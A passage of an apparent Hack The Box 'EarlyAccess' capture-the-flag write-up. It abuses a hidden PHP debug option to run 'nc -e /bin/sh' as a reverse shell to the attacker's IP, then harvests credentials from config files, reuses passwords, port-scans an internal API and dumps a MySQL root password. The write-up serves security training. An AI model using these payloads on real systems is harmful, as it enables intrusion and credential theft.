ID09PSAiaGFzaF9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUtSEFTSElORwogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gImhhc2giKQogICAgICAgIHsKICAgICAgICAgICAgLy8gSEFTSEVTICRwYXNzd29yZCBVU0lORyAkaGFzaF9mdW5jdGlvbgoKICAgICAgICAgICAgaWYoaXNzZXQoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIE9ubHkgYWxsb3cgY3VzdG9tIGhhc2hlcywgaWYgYGRlYnVnYCBpcyBzZXQKICAgICAgICAgICAgICAgIGlmKCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAibWQ1IiAmJiAkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSAhPT0gInNoYTEiICYmICFpc3NldCgkX1JFUVVFU1RbJ2RlYnVnJ10pKQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oIk9ubHkgTUQ1IGFuZCBTSEExIGFyZSBjdXJyZW50bHkgc3VwcG9ydGVkISIpOwoKICAgICAgICAgICAgICAgICRoYXNoID0gaGFzaF9wdygkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSwgJF9SRVFVRVNUWydwYXNzd29yZCddKTsKICAgICAgICAgICAgICAgIGlmKCFpc3NldCgkX1JFUVVFU1RbJ3JlZGlyZWN0J10pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGVjaG8gIlJlc3VsdCBmb3IgSGFzaC1mdW5jdGlvbiAoIiAuICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddIC4gIikgYW5kIHBhc3N3b3JkICgiIC4gJF9SRVFVRVNUWydwYXNzd29yZCddIC4gIik6PGJyPiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGJyPicgLiAkaGFzaDsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydoYXNoJ10gPSAkaGFzaDsKICAgICAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaG9tZS5waHA/dG9vbD1oYXNoaW5nJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgLy8gQWN0aW9uIG5vdCBzZXQsIGlnbm9yZQogICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiIik7Cn0KY2F0Y2goRXhjZXB0aW9uICRleCkKewogICAgaWYoJGV4LT5nZXRNZXNzYWdlKCkgIT09ICIiKQogICAgICAgICRfU0VTU0lPTlsnZXJyb3InXSA9IGh0bWxlbnRpdGllcygkZXgtPmdldE1lc3NhZ2UoKSk7CgogICAgaGVhZGVyKCdMb2NhdGlvbjogL2hvbWUucGhwJyk7CiAgICByZXR1cm47Cn0KPz4=</span><span class="op">&lt;</span>h2<span class="op">&gt;</span>Executed file successfully! </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Decode the base64 to a file locally, in my case called hash.php. Analyzing the code we see that there’s a hidden debug feature available. Playing around with it for a while I came up with this Burp Request to give a reverse shell:</p>
<div class="sourceCode" id="cb37"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="cn">POST</span> <span class="op">/</span>actions<span class="op">/</span><span class="fu">hash</span><span class="op">.</span>php <span class="cn">HTTP</span><span class="op">/</span><span class="fl">1.1</span></span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a>Host<span class="ot">:</span> dev<span class="op">.</span>earlyaccess<span class="op">.</span>htb</span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a>User<span class="op">-</span>Agent<span class="ot">:</span> Mozilla<span class="op">/</span><span class="fl">5.0</span> (<span class="cn">X11</span><span class="ot">;</span> Linux x86_64<span class="ot">;</span> rv<span class="ot">:</span><span class="fl">78.0</span>) Gecko<span class="op">/</span><span class="dv">20100101</span> Firefox<span class="op">/</span><span class="fl">78.0</span></span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>Accept<span class="ot">:</span> text<span class="op">/</span>html<span class="ot">,</span>application<span class="op">/</span>xhtml<span class="op">+</span>xml<span class="ot">,</span>application<span class="op">/</span>xml<span class="ot">;</span>q<span class="op">=</span><span class="fl">0.9</span><span class="ot">,</span>image<span class="op">/</span>webp<span class="ot">,</span><span class="op">*</span><span class="co">/*;q=0.8</span></span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a><span class="co">Accept-Language: en-US,en;q=0.5</span></span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="co">Accept-Encoding: gzip, deflate</span></span>
<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a><span class="co">Content-Type: application/x-www-form-urlencoded</span></span>
<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a><span class="co">Content-Length: 91</span></span>
<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a><span class="co">Origin: http://dev.earlyaccess.htb</span></span>
<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a><span class="co">Connection: close</span></span>
<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a><span class="co">Referer: http://dev.earlyaccess.htb/home.php?tool=hashing</span></span>
<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a><span class="co">Cookie: PHPSESSID=077385c1956824d448397907ce455397</span></span>
<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a><span class="co">Upgrade-Insecure-Requests: 1</span></span>
<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a><span class="co">action=hash&amp;redirect=true&amp;password=nc -e /bin/sh 10.10.14.2 4488&amp;hash_function=exec&amp;debug=1</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb38"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~/Documents/shells/php]</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nc <span class="at">-lvnp</span> 4488                                                                                                                  1 ⨯</span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.2</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.110]</span> 34528</span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span> <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span></span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a><span class="ex">webserver</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-7" class="level3">
<h3 class="anchored" data-anchor-id="step-7">Step 7</h3>
<p>Enumerating the box manually we find mysql creds <code>drew:drew</code> in <code>/var/www/html/.env</code>, however we can’t do anything with them.</p>
<p>Looking in <code>/home/</code> we find user <code>www-adm</code> however no user.txt. As we have a few passwords, lets try a password re-use.</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@webserver:/home/www-adm$</span> su www-adm</span>
<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> </span>
<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a><span class="ex">www-adm@webserver:~$</span> id</span>
<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">www-adm</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">www-adm</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">www-adm</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Working credentials: <strong>www-adm:gameover</strong></p>
<p>Looking in our home dir we find a new set of creds:</p>
<div class="sourceCode" id="cb40"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-adm@webserver:~$</span> cat .wgetrc</span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="va">user</span><span class="op">=</span>api</span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a><span class="va">password</span><span class="op">=</span>s3CuR3_API_PW!</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We could assume that we should connect to a API with the found creds, however we have yet to find a API during this challenge. Poking around we find that something responds when we call <code>api</code> on port 80.</p>
<div class="sourceCode" id="cb41"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-adm@webserver:~$</span> nc api.earlyaccess.htb 80</span>
<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="ex">^CUnknown</span> host</span>
<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a><span class="ex">www-adm@webserver:~$</span> nc api 80                </span>
<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a><span class="ex">api</span> <span class="pp">[</span><span class="ss">172.18.0.101</span><span class="pp">]</span> 80 <span class="er">(</span><span class="ex">http</span><span class="kw">)</span> <span class="bu">:</span> Connection refused</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Do a port scan with netcat to find a active port.</p>
<div class="sourceCode" id="cb42"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-adm@webserver:~$</span> nc <span class="at">-zv</span> api 1-65500</span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="ex">DNS</span> fwd/rev mismatch: api != api.app_nw</span>
<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a><span class="ex">api</span> <span class="pp">[</span><span class="ss">172.18.0.101</span><span class="pp">]</span> 5000 <span class="er">(</span><span class="ex">?</span><span class="kw">)</span> <span class="ex">open</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-adm@webserver:~$</span> curl api:5000</span>
<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="dt">{</span><span class="st">"message"</span><span class="dt">:</span><span class="st">"Welcome to the game-key verification API! You can verify your keys via: /verify/&lt;game-key&gt;. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db."</span><span class="op">,</span><span class="st">"status"</span><span class="dt">:200}</span></span>
<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a><span class="ex">www-adm@webserver:~$</span> curl api:<span class="st">"s3CuR3_API_PW!"</span>@api:5000/check_db</span>
<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a><span class="ex">{</span><span class="st">"message"</span><span class="ex">:{</span><span class="st">"AppArmorProfile"</span><span class="ex">:</span><span class="st">"docker-default"</span><span class="ex">,</span><span class="st">"Args"</span><span class="ex">:[</span><span class="st">"--character-set-server=utf8mb4"</span><span class="ex">,</span><span class="st">"--collation-server=utf8mb4_bin"</span><span class="ex">,</span><span class="st">"--skip-character-set-client-handshake"</span><span class="ex">,</span><span class="st">"--max_allowed_packet=50MB"</span><span class="ex">,</span><span class="st">"--general_log=0"</span><span class="ex">,</span><span class="st">"--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"</span><span class="ex">],</span><span class="st">"Config"</span><span class="ex">:</span><span class="dt">{</span><span class="st">"AttachStderr"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"AttachStdin"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"AttachStdout"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Cmd"</span><span class="dt">:[</span><span class="st">"--character-set-server=utf8mb4"</span><span class="op">,</span><span class="st">"--collation-server=utf8mb4_bin"</span><span class="op">,</span><span class="st">"--skip-character-set-client-handshake"</span><span class="op">,</span><span class="st">"--max_allowed_packet=50MB"</span><span class="op">,</span><span class="st">"--general_log=0"</span><span class="op">,</span><span class="st">"--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"</span><span class="dt">]</span><span class="op">,</span><span class="st">"Domainname"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"Entrypoint"</span><span class="dt">:[</span><span class="st">"docker-entrypoint.sh"</span><span class="dt">]</span><span class="op">,</span><span class="st">"Env"</span><span class="dt">:[</span><span class="st">"MYSQL_DATABASE=db"</span><span class="op">,</span><span class="st">"MYSQL_USER=drew"</span><span class="op">,</span><span class="st">"MYSQL_PASSWORD=drew"</span><span class="op">,</span><span class="st">"MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5"</span><span class="op">,</span><span class="st">"SERVICE_TAGS=dev"</span><span class="op">,</span><span class="st">"SERVICE_NAME=mysql"</span><span class="op">,</span><span class="st">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="op">,</span><span class="st">"GOSU_VERSION=1.12"</span><span class="op">,</span><span class="st">"MYSQL_MAJOR=8.0"</span><span class="op">,</span><span class="st">"MYSQL_VERSION=8.0.25-1debian10"</span><span class="dt">]</span><span class="op">,</span><span class="st">"ExposedPorts"</span><span class="dt">:{</span><span class="st">"3306/tcp"</span><span class="dt">:{}</span><span class="op">,</span><span class="st">"33060/tcp"</span><span class="dt">:{}}</span><span class="op">,</span><span class="st">"Healthcheck"</span><span class="dt">:{</span><span class="st">"Interval"</span><span class="dt">:5000000000</span><span class="op">,</span><span class="st">"Retries"</span><span class="dt">:3</span><span class="op">,</span><span class="st">"Test"</span><span class="dt">:[</span><span class="st">"CMD-SHELL"</span><span class="op">,</span><span class="st">"mysqladmin ping -h 127.0.0.1 --user=</span><span class="va">$MYSQL_USER</span><span class="st"> -p</span><span class="va">$MYSQL_PASSWORD</span><span class="st"> --silent"</span><span class="dt">]</span><span class="op">,</span><span class="st">"Timeout"</span><span class="dt">:2000000000}</span><span class="op">,</span><span class="st">"Hostname"</span><span class="dt">:</span><span class="st">"mysql"</span><span class="op">,</span><span class="st">"Image"</span><span class="dt">:</span><span class="st">"mysql:latest"</span><span class="op">,</span><span class="st">"Labels"</span><span class="dt">:{</span><span class="st">"com.docker.compose.config-hash"</span><span class="dt">:</span><span class="st">"947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839"</span><span class="op">,</span><span class="st">"com.docker.compose.container-number"</span><span class="dt">:</span><span class="st">"1"</span><span class="op">,</span><span class="st">"com.docker.compose.oneoff"</span><span class="dt">:</span><span class="st">"False"</span><span class="op">,</span><span class="st">"com.docker.compose.project"</span><span class="dt">:</span><span class="st">"app"</span><span class="op">,</span><span class="st">"com.docker.compose.project.config_files"</span><span class="dt">:</span><span class="st">"docker-compose.yml"</span><span class="op">,</span><span class="st">"com.docker.compose.project.working_dir"</span><span class="dt">:</span><span class="st">"/root/app"</span><span class="op">,</span><span class="st">"com.docker.compose.service"</span><span class="dt">:</span><span class="st">"mysql"</span><span class="op">,</span><span class="st">"com.docker.compose.version"</span><span class="dt">:</span><span class="st">"1.29.1"</span><span class="dt">}</span><span class="op">,</span><span class="st">"OnBuild"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"OpenStdin"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"StdinOnce"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Tty"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"User"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"Volumes"</span><span class="dt">:{</span><span class="st">"/docker-entrypoint-initdb.d"</span><span class="dt">:{}</span><span class="op">,</span><span class="st">"/var/lib/mysql"</span><span class="dt">:{}}</span><span class="op">,</span><span class="st">"WorkingDir"</span><span class="dt">:</span><span class="st">""</span><span class="dt">}</span><span class="ex">,</span><span class="st">"Created"</span><span class="ex">:</span><span class="st">"2021-09-16T13:38:13.822667973Z"</span><span class="ex">,</span><span class="st">"Driver"</span><span class="ex">:</span><span class="st">"overlay2"</span><span class="ex">,</span><span class="st">"ExecIDs"</span><span class="ex">:null,</span><span class="st">"GraphDriver"</span><span class="ex">:</span><span class="dt">{</span><span class="st">"Data"</span><span class="dt">:{</span><span class="st">"LowerDir"</span><span class="dt">:</span><span class="st">"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff"</span><span class="op">,</span><span class="st">"MergedDir"</span><span class="dt">:</span><span class="st">"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/merged"</span><span class="op">,</span><span class="st">"UpperDir"</span><span class="dt">:</span><span class="st">"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/diff"</span><span class="op">,</span><span class="st">"WorkDir"</span><span class="dt">:</span><span class="st">"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/work"</span><span class="dt">}</span><span class="op">,</span><span class="st">"Name"</span><span class="dt">:</span><span class="st">"overlay2"</span><span class="dt">}</span><span class="ex">,</span><span class="st">"HostConfig"</span><span class="ex">:</span><span class="dt">{</span><span class="st">"AutoRemove"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Binds"</span><span class="dt">:[</span><span class="st">"/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro"</span><span class="op">,</span><span class="st">"app_vol_mysql:/var/lib/mysql:rw"</span><span class="dt">]</span><span class="op">,</span><span class="st">"BlkioDeviceReadBps"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"BlkioDeviceReadIOps"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"BlkioDeviceWriteBps"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"BlkioDeviceWriteIOps"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"BlkioWeight"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"BlkioWeightDevice"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"CapAdd"</span><span class="dt">:[</span><span class="st">"SYS_NICE"</span><span class="dt">]</span><span class="op">,</span><span class="st">"CapDrop"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"Cgroup"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"CgroupParent"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"CgroupnsMode"</span><span class="dt">:</span><span class="st">"host"</span><span class="op">,</span><span class="st">"ConsoleSize"</span><span class="dt">:[0</span><span class="op">,</span><span class="dt">0]</span><span class="op">,</span><span class="st">"ContainerIDFile"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"CpuCount"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"CpuPercent"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"CpuPeriod"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"CpuQuota"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"CpuRealtimePeriod"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"CpuRealtimeRuntime"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"CpuShares"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"CpusetCpus"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"CpusetMems"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"DeviceCgroupRules"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"DeviceRequests"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"Devices"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"Dns"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"DnsOptions"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"DnsSearch"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"ExtraHosts"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"GroupAdd"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"IOMaximumBandwidth"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"IOMaximumIOps"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"IpcMode"</span><span class="dt">:</span><span class="st">"private"</span><span class="op">,</span><span class="st">"Isolation"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"KernelMemory"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"KernelMemoryTCP"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Links"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"LogConfig"</span><span class="dt">:{</span><span class="st">"Config"</span><span class="dt">:{}</span><span class="op">,</span><span class="st">"Type"</span><span class="dt">:</span><span class="st">"json-file"</span><span class="dt">}</span><span class="op">,</span><span class="st">"MaskedPaths"</span><span class="dt">:[</span><span class="st">"/proc/asound"</span><span class="op">,</span><span class="st">"/proc/acpi"</span><span class="op">,</span><span class="st">"/proc/kcore"</span><span class="op">,</span><span class="st">"/proc/keys"</span><span class="op">,</span><span class="st">"/proc/latency_stats"</span><span class="op">,</span><span class="st">"/proc/timer_list"</span><span class="op">,</span><span class="st">"/proc/timer_stats"</span><span class="op">,</span><span class="st">"/proc/sched_debug"</span><span class="op">,</span><span class="st">"/proc/scsi"</span><span class="op">,</span><span class="st">"/sys/firmware"</span><span class="dt">]</span><span class="op">,</span><span class="st">"Memory"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"MemoryReservation"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"MemorySwap"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"MemorySwappiness"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"NanoCpus"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"NetworkMode"</span><span class="dt">:</span><span class="st">"app_nw"</span><span class="op">,</span><span class="st">"OomKillDisable"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"OomScoreAdj"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"PidMode"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"PidsLimit"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"PortBindings"</span><span class="dt">:{}</span><span class="op">,</span><span class="st">"Privileged"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"PublishAllPorts"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"ReadonlyPaths"</span><span class="dt">:[</span><span class="st">"/proc/bus"</span><span class="op">,</span><span class="st">"/proc/fs"</span><span class="op">,</span><span class="st">"/proc/irq"</span><span class="op">,</span><span class="st">"/proc/sys"</span><span class="op">,</span><span class="st">"/proc/sysrq-trigger"</span><span class="dt">]</span><span class="op">,</span><span class="st">"ReadonlyRootfs"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"RestartPolicy"</span><span class="dt">:{</span><span class="st">"MaximumRetryCount"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Name"</span><span class="dt">:</span><span class="st">"always"</span><span class="dt">}</span><span class="op">,</span><span class="st">"Runtime"</span><span class="dt">:</span><span class="st">"runc"</span><span class="op">,</span><span class="st">"SecurityOpt"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"ShmSize"</span><span class="dt">:67108864</span><span class="op">,</span><span class="st">"UTSMode"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"Ulimits"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"UsernsMode"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"VolumeDriver"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"VolumesFrom"</span><span class="dt">:[]}</span><span class="ex">,</span><span class="st">"HostnamePath"</span><span class="ex">:</span><span class="st">"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/hostname"</span><span class="ex">,</span><span class="st">"HostsPath"</span><span class="ex">:</span><span class="st">"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/hosts"</span><span class="ex">,</span><span class="st">"Id"</span><span class="ex">:</span><span class="st">"2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b"</span><span class="ex">,</span><span class="st">"Image"</span><span class="ex">:</span><span class="st">"sha256:5c62e459e087e3bd3d963092b58e50ae2af881076b43c29e38e2b5db253e0287"</span><span class="ex">,</span><span class="st">"LogPath"</span><span class="ex">:</span><span class="st">"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b-json.log"</span><span class="ex">,</span><span class="st">"MountLabel"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"Mounts"</span><span class="ex">:[</span><span class="dt">{</span><span class="st">"Destination"</span><span class="dt">:</span><span class="st">"/docker-entrypoint-initdb.d"</span><span class="op">,</span><span class="st">"Mode"</span><span class="dt">:</span><span class="st">"ro"</span><span class="op">,</span><span class="st">"Propagation"</span><span class="dt">:</span><span class="st">"rprivate"</span><span class="op">,</span><span class="st">"RW"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Source"</span><span class="dt">:</span><span class="st">"/root/app/scripts/init.d"</span><span class="op">,</span><span class="st">"Type"</span><span class="dt">:</span><span class="st">"bind"</span><span class="dt">}</span><span class="ex">,</span><span class="dt">{</span><span class="st">"Destination"</span><span class="dt">:</span><span 